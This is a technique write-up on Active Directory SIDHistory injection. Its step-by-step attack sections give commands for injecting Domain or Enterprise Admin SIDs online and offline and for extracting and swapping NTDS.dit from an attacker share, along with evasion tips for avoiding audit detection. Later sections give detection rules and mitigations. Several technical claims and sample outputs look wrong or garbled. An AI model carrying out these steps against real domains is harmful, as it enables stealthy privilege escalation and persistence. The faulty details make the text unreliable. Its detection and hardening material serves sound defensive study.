# [PE-TOKEN-004]: SIDHistory Injection

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | PE-TOKEN-004 |
| **MITRE ATT&CK v18.1** | [T1134.005 - Access Token Manipulation: SID-History Injection](https://attack.mitre.org/techniques/T1134/005/) |
| **Tactic** | Privilege Escalation, Lateral Movement, Defense Evasion |
| **Platforms** | Windows AD (Domain Controller Functional Level 2003+) |
| **Severity** | Critical |
| **CVE** | N/A (Configuration-based vulnerability; related to CVE-2020-0665 SID filtering bypass) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows Server 2003-2025 (all DFL levels) |
| **Patched In** | Not patched (architectural limitation; mitigated via SID filtering and monitoring) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** SIDHistory Injection is a privilege escalation and persistence technique that directly manipulates the `sIDHistory` Active Directory attribute of a user or computer account to include Security Identifiers (SIDs) of high-privilege groups (Domain Admins, Enterprise Admins). Unlike traditional privilege escalation attacks that modify group memberships (which generate audit events), SIDHistory injection is stealthier because: (1) the attribute is normally empty after account migration is complete, making injected SIDs harder to detect; (2) the injected SIDs are automatically included in user access tokens, granting privileges without explicit group membership; (3) SIDHistory was designed for inter-domain migrations, so cross-domain SID presence is considered "normal." An attacker with Domain Admin privileges (or direct access to the offline NTDS.dit database) can inject arbitrary SIDs into any user's SIDHistory, effectively creating a "shadow admin" account that grants access to resources protected by the injected high-privilege SIDs.

**Attack Surface:** Active Directory user and computer accounts, NTDS.dit database backups, domain controllers with inadequate file system protection, and accounts with SIDHistory already populated (migration remnants). The attack is particularly effective when combined with cross-forest trusts or when legitimate SID History values obscure the injected malicious ones.

**Business Impact:** **Critical – Full domain compromise with deniable persistence.** Successful SIDHistory injection enables attackers to escalate to Domain Admin or Enterprise Admin privileges, maintain persistent access across domain controller restarts (SIDHistory is replicated), access resources across forest boundaries (if SID filtering is disabled), and evade detection because injected accounts appear legitimate within audit trails (legitimate group membership is absent).

**Technical Context:** SIDHistory injection can be performed online (via PowerShell/ADSI as Domain Admin) or offline (via DSInternals on extracted NTDS.dit file). Offline injection is more dangerous because it bypasses online access controls and can be performed by anyone with physical/logical access to domain controller backups. The attack takes 1-5 minutes once sufficient access is obtained. The injected SIDs appear in user access tokens after the next logon/token refresh, granting immediate elevated privileges.

### Operational Risk
- **Execution Risk:** Low-Medium (requires Domain Admin or offline NTDS.dit access, but execution is straightforward)
- **Stealth:** High – SIDHistory attribute is often overlooked in audits; injected SIDs blend with legitimate attributes
- **Reversibility:** No – SIDHistory modifications persist across domain controller replications until explicitly removed; requires domain-wide remediation

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Control 5.3 / 6.2 | Monitor and audit SIDHistory attribute; clean up after migrations; restrict write access to critical AD attributes |
| **DISA STIG** | WN10-AU-000505, WN10-CC-000190 | Audit Active Directory modifications; prohibit unnecessary SIDHistory; enforce least privilege |
| **CISA SCuBA** | ADO-2.1 | Active Directory Security: SID History management and detection; post-migration cleanup |
| **NIST 800-53** | AC-2 (Account Management), AC-3 (Access Control), AC-6 (Least Privilege) | Restrict write permissions to AD; maintain inventories of legitimate SID History; monitor for unauthorized additions |
| **GDPR** | Article 32 | Security of Processing: Detect and prevent unauthorized privilege escalation via SID History injection |
| **DORA** | Article 9 - Protection and Prevention | Implement controls for identifying and responding to unauthorized privilege escalation |
| **NIS2** | Article 21 - Cyber Risk Management | Detect unauthorized SID History modifications; maintain audit logs for forensic analysis |
| **ISO 27001** | A.9.2.3 - Management of Privileged Access Rights | Monitor and audit privileged user attributes; remove unnecessary SID History post-migration |
| **ISO 27005** | Risk Scenario: "Shadow Admin Creation via SID History" | Identify and mitigate risks from unauthorized SID History injection and persistence |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges (Online Method):**
- **Domain Admin** or equivalent (required to modify sIDHistory attribute via PowerShell or ADSI)
- **Direct write access to NTDS.dit** (Windows ResetPassword, lsass impersonation, or Volume Shadow Copy)

**Required Privileges (Offline Method):**
- **Physical or logical access to domain controller backup** or NTDS.dit file
- **Administrator rights on the system running DSInternals** (offline modification tool)
- **SYSTEM access** (for shadow copy manipulation)

**Required Access:**
- Network access to Domain Controller (LDAP 389, or Kerberos 88)
- Alternatively: File system access to NTDS.dit database (can be obtained via Volume Shadow Copy)

**Supported Versions:**
- **Windows:** Domain Functional Level 2003+ (feature introduced in Windows 2000, widely used from 2003+)
- **Tools:** DSInternals (PowerShell module), Mimikatz (token manipulation), native PowerShell AD module

**Tools:**
- [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) (Add-ADDBSidHistory command for offline injection)
- [PowerShell Active Directory Module](https://learn.microsoft.com/en-us/powershell/module/activedirectory/) (Set-ADUser, Set-ADComputer for online injection)
- [ADSI Edit](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/administering-active-directory-domain-services-server/add-remove-replace-attributes-adsi-edit) (GUI-based attribute modification)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (sid::* modules)
- [Impacket](https://github.com/fortra/impacket) (secretsdump.py for offline NTDS.dit extraction)
- [ntdsutil.exe](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/cc753343%28v=ws.10%29) (Create NTDS backup for offline access)
- [vssadmin](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/vssadmin) (Create Volume Shadow Copy)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### PowerShell Reconnaissance

**Identify Users with Existing SIDHistory (Post-Migration Remnants):**

```powershell
# Query all users with populated SIDHistory
Get-ADUser -Filter {sIDHistory -ne $null} -Properties sIDHistory | Select-Object Name, sIDHistory

# Expected output (if legitimate migration remnants exist):
# Name    sIDHistory
# ----    -----------
# JaneEU  {S-1-5-21-OLDDOMAIN-500}
```

**What to Look For:**
- Users with SIDHistory from old migrations (should be cleaned up post-migration)
- SID RIDs 512 (Domain Admins), 519 (Enterprise Admins), 544 (BUILTIN\Administrators) = suspicious
- Recently added SIDHistory entries = potential injection attack
- Cross-domain SIDs that don't correspond to known trusts/migrations

**Enumerate Domain Admins SID (for Injection Target):**

```powershell
# Get the SID of Domain Admins group
$domain = Get-ADDomain
$daGroupSID = $domain.DomainSID.Value + "-512"  # RID 512 = Domain Admins

Write-Host "Domain Admins SID to inject: $daGroupSID"

# Alternative: Get Enterprise Admins SID (forest root domain only)
$eaGroupSID = $domain.DomainSID.Value + "-519"  # RID 519 = Enterprise Admins

Write-Host "Enterprise Admins SID: $eaGroupSID"
```

**Expected Output:**

```
Domain Admins SID to inject: S-1-5-21-123456789-123456789-123456789-512
Enterprise Admins SID: S-1-5-21-123456789-123456789-123456789-519
```

**Version Note:** All commands work on Server 2003+.

### Check NTDS.dit Accessibility (Prerequisite for Offline Attack)

```powershell
# Check if NTDS.dit file is accessible (on DC)
$ntdsPath = "$env:SystemRoot\NTDS\ntds.dit"
Test-Path -Path $ntdsPath

# If accessible (false = requires privileged access or shadow copy)
Get-Item -Path $ntdsPath | Select-Object FullName, LastWriteTime

# Attempt to create Volume Shadow Copy (VSS)
vssadmin list shadows  # Lists existing shadow copies
# If output shows copies, attacker can extract NTDS.dit from them
```

**What to Look For:**
- If NTDS.dit is directly readable = very poor security (unimaginable in production)
- If VSS is enabled and backups exist = NTDS.dit may be extractable from shadow copies
- If neither = offline attack requires stopping AD or accessing DC backups

### Linux/Bash Reconnaissance

**Query SIDHistory via LDAP (if cross-domain access exists):**

```bash
# Enumerate users with SID History via LDAP
ldapsearch -x -H ldap://DC01 -b "dc=domain,dc=com" "(sIDHistory=*)" cn sIDHistory

# Check specific user
ldapsearch -x -H ldap://DC01 -b "dc=domain,dc=com" "(&(objectClass=user)(cn=JaneEU))" sIDHistory
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Online SIDHistory Injection via PowerShell (Domain Admin Context)

**Supported Versions:** Domain Functional Level 2003+

**Prerequisites:**
- Domain Admin privileges or equivalent
- PowerShell AD module access

#### Step 1: Identify Target User and High-Privilege SID to Inject

**Objective:** Select a target user account and determine which high-privilege SID to inject.

**Command:**

```powershell
# Target user (e.g., low-privilege account to escalate)
$targetUser = Get-ADUser -Identity "normaluser"

# Get Domain Admins SID
$domain = Get-ADDomain
$daGroupSID = $domain.DomainSID.Value + "-512"

Write-Host "Target User: $($targetUser.Name)"
Write-Host "Target SID to Inject: $daGroupSID"
```

**Expected Output:**

```
Target User: normaluser
Target SID to Inject: S-1-5-21-123456789-123456789-123456789-512
```

**What This Means:**
- Selected user will receive Domain Admins SID in their SIDHistory
- After next logon, user's token will include Domain Admins privileges
- User will appear to have DA access without explicit group membership

**OpSec & Evasion:**
- Choose inconspicuous accounts (service accounts, disabled accounts, recently onboarded users)
- Avoid selecting high-visibility users (existing admins, executives)
- Detection likelihood: Low-Medium (if SIDHistory auditing is not enabled)

#### Step 2: Inject SID into Target User's SIDHistory

**Objective:** Add the high-privilege SID to the user's sIDHistory attribute.

**Command (Via PowerShell):**

```powershell
# Method 1: Direct attribute modification (requires proper permissions)
$targetUser = Get-ADUser -Identity "normaluser"

# Create SID object
$sIDHistory = @($daGroupSID)  # $daGroupSID from Step 1

# Modify user's sIDHistory attribute
Set-ADUser -Identity $targetUser -Replace @{sIDHistory = $sIDHistory}

Write-Host "[+] SIDHistory injection successful"
Write-Host "    User: $($targetUser.Name)"
Write-Host "    Injected SID: $daGroupSID"
```

**Alternative (Via ADSI Edit – GUI Method):**

1. Open **ADSI Edit** (adsiedit.msc)
2. Right-click → **Connect to**
3. Select **Default Naming Context** (or specify DC)
4. Navigate to: **CN=Users** → Select target user → **Properties**
5. Find attribute: **sIDHistory**
6. Click **Edit** → **Add**
7. Enter SID in format: `S-1-5-21-123456789-123456789-123456789-512`
8. **OK** → **Apply**

**Expected Output:**

```
[+] SIDHistory injection successful
    User: normaluser
    Injected SID: S-1-5-21-123456789-123456789-123456789-512
```

**What This Means:**
- SIDHistory attribute now contains the Domain Admins SID
- Change is replicated to all domain controllers
- Persists across DC restarts and password changes

**OpSec & Evasion:**
- This operation generates **Event ID 5136** (Directory Service Object Attribute Modified)
- Perform during high-activity periods to blend with legitimate AD changes
- Consider timing the injection with known legitimate SIDHistory operations (migrations, consolidations)
- Detection likelihood: Medium-High (if auditing is enabled)

**Troubleshooting:**
- **Error:** `[-] Access denied modifying sIDHistory`
  - **Cause:** Insufficient permissions (not Domain Admin)
  - **Fix (All Versions):** Escalate to Domain Admin or use offline method (METHOD 2)

#### Step 3: Verify SIDHistory Injection

**Objective:** Confirm that the SID was successfully injected.

**Command:**

```powershell
# Verify SIDHistory injection
$user = Get-ADUser -Identity "normaluser" -Properties sIDHistory
$user.sIDHistory

# Expected output:
# S-1-5-21-123456789-123456789-123456789-512

# If empty = injection failed
if ($user.sIDHistory -eq $null) {
    Write-Host "[-] SIDHistory injection FAILED"
} else {
    Write-Host "[+] SIDHistory injection confirmed"
    Write-Host "    Injected SIDs: $($user.sIDHistory)"
}
```

**Expected Output:**

```
[+] SIDHistory injection confirmed
    Injected SIDs: S-1-5-21-123456789-123456789-123456789-512
```

#### Step 4: Force Token Refresh (Logoff and Logon)

**Objective:** Cause the target user to obtain a new access token that includes the injected SID.

**Command (On Target User Session):**

```powershell
# Option 1: User logs off and logs back in
logoff  # Signs out current user

# Option 2: Request new Kerberos TGT (forces token refresh)
klist -li 0x3e7 purge  # Purge existing Kerberos cache

# Then request new TGT
# (User must authenticate again)
```

**Alternative (Force via PowerShell – Requires Domain Admin):**

```powershell
# Remote: Force user session disconnect (administrative logoff)
Get-ADComputer -Filter "OperatingSystem -like 'Windows*'" | ForEach-Object {
    invoke-command -ComputerName $_.Name -ScriptBlock {
        # Disconnect user sessions
        logoff /v:999 /server:localhost
    }
}
```

#### Step 5: Access Resources as Injected High-Privilege User

**Objective:** Use the new token (containing injected Domain Admin SID) to access protected resources.

**Command (Verify Privilege Escalation):**

```powershell
# Test access to administrative shares and resources
dir \\DC01\SYSVOL
dir \\DC01\NETLOGON
dir \\FileServer\AdminShare$

# Check current user's token
whoami /priv  # Should NOT show explicit DA privileges (stealth)

# But should have implicit DA access to resources protected by DA SIDs
# (Without appearing as DA in group membership)
```

**Expected Output (If Successful):**

```
Directory of \\DC01\SYSVOL
<DIR>   domain.com
<DIR>   *.gpt files

[+] Successfully accessed Domain Admin resources without explicit DA group membership
```

**What This Means:**
- User can now access resources protected by injected SID
- Appears as regular user in group memberships (stealth)
- Has implicit Domain Admin privileges in access tokens

---

### METHOD 2: Offline SIDHistory Injection via DSInternals (NTDS.dit Manipulation)

**Supported Versions:** Domain Functional Level 2003+

**Prerequisites:**
- Access to offline NTDS.dit file (via Volume Shadow Copy, backup, or DC file system)
- Administrator privileges to run DSInternals on the extraction machine

#### Step 1: Extract NTDS.dit from Domain Controller

**Objective:** Obtain a copy of the NTDS.dit file for offline manipulation.

**Option A: Via Volume Shadow Copy (if VSS enabled):**

```powershell
# List existing shadow copies
vssadmin list shadows

# Mount shadow copy (requires local system access)
$shadowCopy = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1"
cmd /c "mklink /d C:\ShadowCopyMount $shadowCopy"

# Extract NTDS.dit from shadow copy
Copy-Item "C:\ShadowCopyMount\Windows\NTDS\ntds.dit" -Destination "C:\Temp\ntds.dit" -Force

# Also copy SYSTEM registry hive (needed for decryption)
Copy-Item "C:\ShadowCopyMount\Windows\System32\config\SYSTEM" -Destination "C:\Temp\SYSTEM" -Force
```

**Option B: Via ntdsutil (requires stopping AD):**

```cmd
# Run on domain controller (requires SYSTEM context)
ntdsutil
  activate instance NTDS
  ifm
  create full C:\Backup
  quit
quit

# NTDS.dit will be in C:\Backup\Active Directory\ntds.dit
# Copy to attacker machine for offline processing
```

**Option C: Via secretsdump (Impacket, remotely from Linux):**

```bash
# Dump NTDS.dit remotely (requires domain admin credentials + SMB access)
python3 -m impacket.examples.secretsdump -dc-ip 10.0.0.1 'DOMAIN/Administrator:Password@DC01'

# This will output hashes but can also save NTDS for offline processing
```

**Expected Output:**

```
C:\Backup\Active Directory\ntds.dit (3.5 GB)
C:\Backup\Active Directory\SYSTEM (file needed for decryption key)
```

**What This Means:**
- NTDS.dit obtained and ready for offline processing
- SYSTEM hive contains DPAPI key needed to decrypt sensitive attributes
- Attack can now proceed without requiring Domain Admin credentials on live system

#### Step 2: Install DSInternals Module

**Objective:** Set up DSInternals PowerShell module for offline NTDS manipulation.

**Command (On Attacker Machine):**

```powershell
# Install DSInternals from PowerShell Gallery
Install-Module -Name DSInternals -Force

# Alternative: Download from GitHub
git clone https://github.com/MichaelGrafnetter/DSInternals.git
Import-Module .\DSInternals\DSInternals\DSInternals.psd1
```

**Expected Output:**

```
Downloading NuGet provider...
DSInternals module installed successfully
```

#### Step 3: Inject SID into NTDS.dit Offline

**Objective:** Add high-privilege SID to target user's sIDHistory in the offline NTDS.dit file.

**Command (DSInternals):**

```powershell
# Import DSInternals module
Import-Module DSInternals

# Get target user and the high-privilege SID to inject
$targetSID = "S-1-5-21-123456789-123456789-123456789-512"  # Domain Admins

# Add SID History to user (offline method)
Add-ADDBSidHistory -SamAccountName "normaluser" -SidHistory $targetSID -DatabasePath "C:\Temp\ntds.dit" -LogPath "C:\Temp\ntds.log"

Write-Host "[+] SIDHistory injection completed offline"
Write-Host "    User: normaluser"
Write-Host "    Injected SID: $targetSID"
```

**Expected Output:**

```
[+] SIDHistory injection completed offline
    User: normaluser
    Injected SID: S-1-5-21-123456789-123456789-123456789-512
[*] Modifications will be applied when NTDS.dit is restored to domain controller
```

**What This Means:**
- NTDS.dit database modified with injected SID
- No online access logs generated (stealthier than online method)
- Modifications not yet live (requires restoring NTDS.dit to DC)

**OpSec & Evasion:**
- No Event IDs generated during offline modification (stealth advantage)
- Takes place outside of domain audit scope
- Very difficult to detect without file integrity monitoring on NTDS.dit backups

#### Step 4: Restore Modified NTDS.dit to Domain Controller

**Objective:** Replace the legitimate NTDS.dit on the DC with the modified version.

**Command (Option A: Via IFM Restore – Requires DC Restart):**

```cmd
# On domain controller, stop Active Directory
net stop ntds

# Backup original NTDS.dit
move C:\Windows\NTDS\ntds.dit C:\Windows\NTDS\ntds.dit.backup

# Copy modified NTDS.dit from attacker machine (via USB, file share, etc.)
copy \\attacker\modified\ntds.dit C:\Windows\NTDS\ntds.dit

# Start Active Directory
net start ntds
```

**Command (Option B: Via NTDS.dit Replacement During Maintenance Window):**

```powershell
# Method: DirectoryReplication (if attacker has replication rights)
# This is more complex and requires DRSUAPI access
```

**Expected Output:**

```
[+] NTDS.dit replaced with modified version
[+] Active Directory restarted
[+] SIDHistory injection is now active on all domain controllers (via replication)
```

**What This Means:**
- Modified NTDS.dit is now the live directory database
- All domain controllers will replicate the injected SIDHistory
- Target user's token now includes injected Domain Admin SID after logon

#### Step 5: Verify Injection and Access Resources

**Objective:** Confirm that target user can access resources with injected privileges.

**Command:**

```powershell
# Target user logs in and verifies access
dir \\DC01\SYSVOL
dir \\FileServer\AdminShare$

# Check user's group membership (should NOT show DA explicitly)
net user normaluser /domain | findstr /i "group"
# Output should NOT include "Domain Admins"

# But should have access to DA-protected resources (proof of injection)
```

---

### METHOD 3: Cross-Forest SIDHistory Injection (Enterprise Admin Escalation)

**Supported Versions:** Domain Functional Level 2003+ with cross-forest trusts

**Prerequisites:**
- Domain Admin in source forest
- Access to target forest's Enterprise Admins SID
- Cross-forest trust with **SID filtering disabled** (vulnerable)

#### Step 1-3: Same as Method 1 (Steps 1-3), but inject Enterprise Admins SID

**Command:**

```powershell
# Get Enterprise Admins SID from forest root domain
$forestRoot = Get-ADForest
$rootDomain = Get-ADDomain -Server $forestRoot.RootDomain

$eaGroupSID = $rootDomain.DomainSID.Value + "-519"  # RID 519 = Enterprise Admins

Write-Host "Enterprise Admins SID: $eaGroupSID"

# Inject into user in child domain
$targetUser = Get-ADUser -Identity "normaluser"
Set-ADUser -Identity $targetUser -Replace @{sIDHistory = $eaGroupSID}

Write-Host "[+] Cross-forest Enterprise Admin SID injected"
```

#### Step 4-5: Same as Method 1 (Steps 4-5), verify cross-forest access

---

## 6. TOOLS & COMMANDS REFERENCE

### [DSInternals](https://github.com/MichaelGrafnetter/DSInternals)

**Version:** 1.24+

**Installation:**

```powershell
Install-Module -Name DSInternals -Force
# Or: Import-Module .\DSInternals.psd1
```

**Key Commands:**

```powershell
# Add SID History offline
Add-ADDBSidHistory -SamAccountName User -SidHistory "S-1-5-21-X-512" -DatabasePath "ntds.dit"

# Get user from offline NTDS
Get-ADDBUser -SamAccountName User -DatabasePath "ntds.dit"

# Create bootable media with injected changes (advanced)
Restore-ADDatabase -DatabasePath "ntds.dit" -LogPath "ntds.log"
```

---

### [Mimikatz – SID Manipulation](https://github.com/gentilkiwi/mimikatz)

**Commands:**

```cmd
mimikatz # sid::list
mimikatz # sid::add /domain:DOMAIN /user:normaluser /sid:S-1-5-21-X-512
mimikatz # sid::patch  # Patch token with new SID (requires SYSTEM)
```

---

### [PowerShell Active Directory Module](https://learn.microsoft.com/en-us/powershell/module/activedirectory/)

**Commands:**

```powershell
# Query SIDHistory
Get-ADUser -Filter {sIDHistory -ne $null} -Properties sIDHistory

# Modify SIDHistory
Set-ADUser -Identity Username -Replace @{sIDHistory = "S-1-5-21-X-512"}

# Clear SIDHistory
Set-ADUser -Identity Username -Clear sIDHistory
```

---

## 7. WINDOWS EVENT LOG MONITORING

**Event ID: 5136 (Directory Service Object Attribute Modified)**

- **Log Source:** Directory Service (DC)
- **Trigger:** sIDHistory attribute changed
- **Filter:** `EventID=5136 AND AttributeLDAPDisplayName="sIDHistory"`
- **Applies To Versions:** Server 2003+

**Event ID: 4742 (Computer Account Changed) / 4738 (User Account Changed)**

- **Log Source:** Security (DC)
- **Trigger:** SID History added to account via user/computer modification
- **Filter:** `(EventID=4742 OR EventID=4738) AND SidHistory!="%%1793"`
- **Applies To Versions:** Server 2003+

**Event ID: 4766 (SID History Successfully Added)**

- **Log Source:** Security (DC)
- **Trigger:** SID History attribute modified successfully
- **Filter:** `EventID=4766 AND NOT SubjectUserName="DOMAIN$"`
- **Applies To Versions:** Server 2003+

**Manual Configuration Steps (Enable Auditing):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies** → **Account Management**
3. Enable: **Audit User Account Management** and **Audit Computer Account Management** (Both: Success and Failure)
4. Also enable (in **DS Access**): **Audit Directory Service Changes** (Success and Failure)
5. Run `gpupdate /force`

---

## 8. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

**Sysmon XML Configuration (Detect SIDHistory Manipulation):**

```xml
<Sysmon schemaversion="4.30">
  <EventFiltering>
    <!-- Rule: Detect ADSI Edit execution (online SIDHistory modification) -->
    <RuleGroup name="SIDHistory-Injection - ADSI Edit" groupRelation="and">
      <ProcessCreate onmatch="include">
        <Image condition="is">C:\Windows\System32\adsiedit.msc</Image>
      </ProcessCreate>
    </RuleGroup>

    <!-- Rule: Detect PowerShell AD module SIDHistory modification -->
    <RuleGroup name="SIDHistory-Injection - PowerShell" groupRelation="and">
      <ProcessCreate onmatch="include">
        <Image condition="contains">powershell</Image>
        <CommandLine condition="contains any">Set-ADUser;sIDHistory;Add-ADDBSidHistory</CommandLine>
      </ProcessCreate>
    </RuleGroup>

    <!-- Rule: Detect DSInternals module usage -->
    <RuleGroup name="SIDHistory-Injection - DSInternals" groupRelation="and">
      <ProcessCreate onmatch="include">
        <Image condition="contains">powershell</Image>
        <CommandLine condition="contains any">Add-ADDBSidHistory;DSInternals;ntds.dit</CommandLine>
      </ProcessCreate>
    </RuleGroup>

    <!-- Rule: Detect NTDS.dit file access (offline attack precursor) -->
    <RuleGroup name="SIDHistory-Injection - NTDS Access" groupRelation="and">
      <FileCreate onmatch="include">
        <TargetFilename condition="contains">ntds.dit</TargetFilename>
      </FileCreate>
      <FileCreate onmatch="include">
        <TargetFilename condition="contains">vssadmin</TargetFilename>
      </FileCreate>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

---

## 9. MICROSOFT SENTINEL DETECTION

### KQL Query 1: Detect Privileged SID History Injection

```kusto
SecurityEvent
| where EventID in (4766, 4742, 4738)
| where SidHistory !in ("%%1793", "")  // Exclude empty/null values
| where SidHistory matches regex @"S-1-5-\d+-512$|S-1-5-\d+-519$|S-1-5-\d+-544$"  // DA/EA/BUILTIN\Admins RIDs
| project TimeGenerated, Computer, TargetUserName, SidHistory, SubjectUserName
| where SubjectUserName !contains "SYSTEM" and SubjectUserName !contains "migration"
```

### KQL Query 2: Detect Anomalous SIDHistory Count

```kusto
SecurityEvent
| where EventID == 4742 or EventID == 4738
| where isnotnull(SidHistory)
| summarize Count = count() by TargetUserName, SidHistory
| where Count > 3  // Anomalous: legitimate migrations typically have 1-2 SIDs
```

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. Name: `SIDHistory Injection - Privilege Escalation Detection`
3. Paste KQL query
4. Run every: 5 minutes
5. Alert threshold: Any result
6. Severity: Critical

---

## 10. MICROSOFT DEFENDER FOR CLOUD

**Alert Name:** Active Directory SID History injection detected

- **Severity:** Critical
- **Description:** MDC detects unauthorized addition of privileged SIDs to user or computer accounts
- **Remediation:** Immediately review and remove injected SIDs; initiate incident response; check for lateral movement

---

## 11. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Enforce SID Filtering on All Cross-Forest and External Trusts**

SID filtering prevents exploitation of SIDHistory across trust boundaries.

**Applies To Versions:** Server 2003+

**Manual Steps (Enable SID Filtering):**

```powershell
# Check current trust configuration
Get-ADTrust -Filter * | Select-Object Name, TrustDirection, TrustAttributes

# Enable selective authentication (if forest trust)
Set-ADTrust -Identity "external.forest.com" -SelectiveAuthenticationEnabled $true

# Verify SID filtering is enabled
$trust = Get-ADTrust -Identity "external.forest.com"
if ($trust.TrustAttributes -band 0x40) {
    Write-Host "[+] SID Filtering: ENABLED (Secure)"
} else {
    Write-Host "[-] SID Filtering: DISABLED (Vulnerable)"
}
```

**Manual Steps (Via GUI – Active Directory Domains and Trusts):**

1. Open **Active Directory Domains and Trusts**
2. Right-click domain → **Properties** → **Trusts** tab
3. Select external/forest trust → **Properties**
4. **Trust Options** tab: ✅ Enable **Selective Authentication**
5. Click **OK**

---

**2. Clean Up SIDHistory After All Legitimate Migrations**

Remove stale and unnecessary SID History values to reduce attack surface.

**Applies To Versions:** Server 2003+

**Manual Steps:**

```powershell
# Identify users with SIDHistory (should be empty in stable environment)
$usersWithSIDHistory = Get-ADUser -Filter {sIDHistory -ne $null} -Properties sIDHistory

Write-Host "Users with SIDHistory (potential vulnerability or legitimate migration remnants):"
foreach ($user in $usersWithSIDHistory) {
    Write-Host "  $($user.Name): $($user.sIDHistory)"
}

# Review each one and determine if legitimate
# If legacy migration and no longer needed, REMOVE:

# Remove SIDHistory from specific user
Set-ADUser -Identity "JaneEU" -Clear sIDHistory

# Remove all SIDHistory domain-wide (use with caution!)
# Get-ADUser -Filter {sIDHistory -ne $null} | ForEach-Object {
#     Set-ADUser -Identity $_ -Clear sIDHistory
# }
```

**Validation Command (Verify Cleanup):**

```powershell
# Audit: Should return empty or very few results (only legitimate migrations in progress)
Get-ADUser -Filter {sIDHistory -ne $null} -Properties sIDHistory

# If any results, investigate and clean up
```

---

**3. Restrict Write Access to sIDHistory Attribute**

Limit who can modify the sIDHistory attribute via DACL modifications.

**Applies To Versions:** Server 2003+

**Manual Steps (Advanced – DACL Modification):**

```powershell
# Get DN of user container
$userContainerDN = "CN=Users,$(Get-ADRootDSE).defaultNamingContext"

# Get current ACL
$acl = Get-Acl -Path "AD:\$userContainerDN"

# Create deny rule: Prevent non-admins from modifying sIDHistory
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    [System.Security.Principal.SecurityIdentifier]"S-1-5-11",  # Authenticated Users
    [System.DirectoryServices.ActiveDirectoryRights]"WriteProperty",
    [System.Security.AccessControl.AccessControlType]"Deny",
    [GUID]"6da004a8-a55b-4bb9-b25e-0f13d8d6e89c"  # sIDHistory attribute GUID
)

$acl.AddAccessRule($rule)
Set-Acl -Path "AD:\$userContainerDN" -AclObject $acl

Write-Host "[+] Write access to sIDHistory restricted for non-admins"
```

---

### Priority 2: HIGH

**4. Implement Protected Users Security Group**

Protected Users group members cannot have SIDHistory exploited or delegated to other users.

**Manual Steps:**

```powershell
# Add sensitive accounts to Protected Users
Add-ADGroupMember -Identity "Protected Users" -Members "DOMAIN\ServiceAccount1", "DOMAIN\HighValue"

# Verify
Get-ADGroupMember -Identity "Protected Users" | Select-Object Name

# WARNING: Protected Users restrictions can break some delegation scenarios
# Test thoroughly before applying in production
```

---

**5. Enable Enhanced Auditing for SIDHistory and Directory Service Changes**

Monitor and alert on all modifications to critical attributes.

**Manual Steps (Configure Auditing):**

```powershell
# Enable audit events for SIDHistory modifications
auditpol /set /subcategory:"User Account Management" /success:enable /failure:enable
auditpol /set /subcategory:"Computer Account Management" /success:enable /failure:enable
auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable

# Verify auditing is enabled
auditpol /get /subcategory:"User Account Management"
auditpol /get /subcategory:"Directory Service Changes"
```

---

**6. Protect NTDS.dit and Domain Controller Backups**

Ensure offline NTDS.dit files are encrypted and access-controlled.

**Manual Steps:**

```powershell
# Verify NTDS.dit permissions (should be SYSTEM only)
Get-Acl -Path "$env:SystemRoot\NTDS\ntds.dit" | Format-List

# Encrypt NTDS backups (BitLocker)
# Ensure DC drives are BitLocker-encrypted

# Restrict backup access
icacls "\\backupserver\DCBackups" /grant:r "Administrators:(F)" /grant:r "SYSTEM:(F)" /remove:g "*"

Write-Host "[+] NTDS.dit access restricted; backups encrypted"
```

---

**Validation Command (Verify All Mitigations):**

```powershell
Write-Host "[*] Checking SID Filtering on trusts..."
Get-ADTrust -Filter * | ForEach-Object {
    $sfStatus = if ($_.TrustAttributes -band 0x40) { "ENABLED" } else { "DISABLED" }
    Write-Host "  $($_.Name): $sfStatus"
}

Write-Host "[*] Checking for stale SIDHistory..."
$stale = Get-ADUser -Filter {sIDHistory -ne $null} -Properties sIDHistory
if ($stale) {
    Write-Host "  [!] Found $($stale.Count) users with SIDHistory - should be zero"
} else {
    Write-Host "  [+] No stale SIDHistory found (expected)"
}

Write-Host "[*] Checking Protected Users membership..."
Get-ADGroupMember -Identity "Protected Users" | Select-Object Name

Write-Host "[*] Verifying NTDS.dit permissions..."
Get-Acl -Path "$env:SystemRoot\NTDS\ntds.dit" | Select-Object Owner, Access

Write-Host "[*] Checking audit policies..."
auditpol /get /subcategory:"Directory Service Changes"
```

---

## 12. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files:**
- ADSI Edit (adsiedit.msc) execution traces
- DSInternals PowerShell module presence
- NTDS.dit backups or copies in suspicious locations
- Mimikatz executables with sid::* commands

**Registry:**
- PowerShell execution history: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`
- Recent files registry

**Network:**
- LDAP queries modifying sIDHistory attribute (port 389)
- Volume Shadow Copy operations (vssadmin)
- Unusual file transfers (NTDS.dit extraction)

**Event Logs:**
- **Event ID 5136** – sIDHistory attribute modified
- **Event ID 4766** – SID History successfully added
- **Event ID 4742/4738** – User/Computer account changed (with SidHistory field populated)
- **Event ID 4660** – Object access to %SystemRoot%\NTDS\ntds.dit

